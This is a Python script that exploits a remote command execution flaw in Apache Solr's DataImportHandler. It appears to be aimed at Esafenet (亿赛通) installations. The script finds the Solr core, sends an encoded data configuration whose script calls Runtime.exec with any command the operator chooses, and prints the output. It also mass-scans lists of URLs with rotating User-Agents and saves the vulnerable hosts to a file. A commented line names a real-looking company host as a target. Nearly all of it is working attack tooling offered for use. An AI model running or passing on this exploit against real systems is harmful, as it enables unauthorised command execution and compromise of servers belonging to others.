#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2021-02-21 16:34:54
# @Author  : 江南小虫虫 (fwh13612265462@gmail.com)
# @Link    : https://fengwenhua.top

import requests
requests.packages.urllib3.disable_warnings()
import urllib.parse
import re
import sys
import argparse
import random


def usera():
    """随机选择UA
    """
    user_agent_list = [
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '
        'Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3',
        'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)',
        'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)',
        'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
        'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11',
        'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)',
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0',
        'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
    ]
    # 随机选择一个
    user_agent = random.choice(user_agent_list)
    return user_agent


def exp(target, core_name, cmd, logs_file):
    """执行命令
    :param target: 目标，http(s)://ip(domain):port，后面没有/
    :param cmd: 要执行的命令
    :return
    """

    print('url: ' + target, file=logs_file)
    cmd = urllib.parse.quote(cmd)
    URL = '''{}/solr/{}/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22{}%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20'''.format(target, core_name, cmd)
    files = {'stream.body': '''<?xml version="1.0" encoding="UTF-8"?>
    <RDF>
    <item/>
    </RDF>'''}

    headers = {
        'User-Agent': usera()
    }
    try:
        r = requests.post(URL, files=files, headers=headers,
                          verify=False, timeout=8)
        final_result = r.text
        if r.status_code == 200:

            result = re.search(
                r'documents"><lst><arr name="title"><str>([\s\S]*?)</str></arr></lst>', final_result, re.I)
            if result:
                final_result = result.group(1)
            else:
                print("没有洞，GG")
                return False
            print("有漏洞！！！", file=logs_file)
            print("有漏洞！！！")
            print("命令执行结果：", file=logs_file)
            print("命令执行结果：")
            print(final_result, file=logs_file)
            print(final_result)
            return True
        else:
            print("没有洞，GG")
            return False
    except requests.exceptions.RequestException as e:
        print(e, file=logs_file)


def get_core_name(target):
    """获取solr名字，默认是flow
    :param target: 目标，http(s)://ip(domain):port，后面没有/
    :return
    """
    url = '{}/solr/admin/cores'.format(target)
    headers = {
        'User-Agent': usera()
    }
    r = requests.get(url, headers=headers, verify=False)
    #  and '<lst name="responseHeader">' in r.text
    # print("漏洞探测：")
    final_result = r.text
    if r.status_code == 200:
        result = re.search(
            r'<str name="name">([\s\S]*?)</str><str name="instanceDir">', final_result, re.I)
        if result:
            final_result = result.group(1)
            # print('core_name: ', final_result)
            return final_result
        else:
            # print(r.text)
            return False
    else:
        # print(r.text)
        return False


def load_file(file_path):
    with open(file_path, 'r') as f:
        url_list = f.read().splitlines()
        # print(url_list)
        return url_list


def write_file(data_list):
    with open('yisaitong-vul-list.txt', 'w') as f:
        f.write('\n'.join(data_list))


if __name__ == '__main__':
    # # target后面没有 /
    #target = 'https://www.chinashb.com:8443'
    #cmd = 'ipconfig /all'
    if len(sys.argv) == 1:
        print("Usage: python3 yisaitong-rce.py -u url -c cmd -f url.txt")
        sys.exit()
    parser = argparse.ArgumentParser(
        description='亿赛通rce利用工具')
    parser.add_argument('-u', '--url', help='指定单个url')
    parser.add_argument('-c', '--cmd', default='whoami', help='要执行的命令')
    parser.add_argument('-f', '--file', help='指定要测试的urls文件')
    parser.add_argument('-k', '--skip', help='跳过core_name', default=True)
    args = parser.parse_args()

    logs_file = open('yisaitong-log.txt', 'w')
    cmd = args.cmd
    target = args.url
    if target:
        core_name = get_core_name(target)
        if core_name:
            exp(target, core_name, cmd, logs_file)
        else:
            print('NO VUL')
    if args.file:
        vul_url_list = []
        for url in load_file(args.file):
            print('处理：', url)
            print('处理：' + url, file=logs_file)
            if args.skip:
                core_name = 'flow'
            else:
                core_name = get_core_name(url)
            if core_name:
                res = exp(url, core_name, cmd, logs_file)
                if res:
                    vul_url_list.append(url)
            else:
                print('NO VUL' + url, file=logs_file)
        if len(vul_url_list) > 0:
            write_file(vul_url_list)
            print("url列表已经写入文件当前目录下的 yisaitong-vul-list.txt 了")
    logs_file.close()
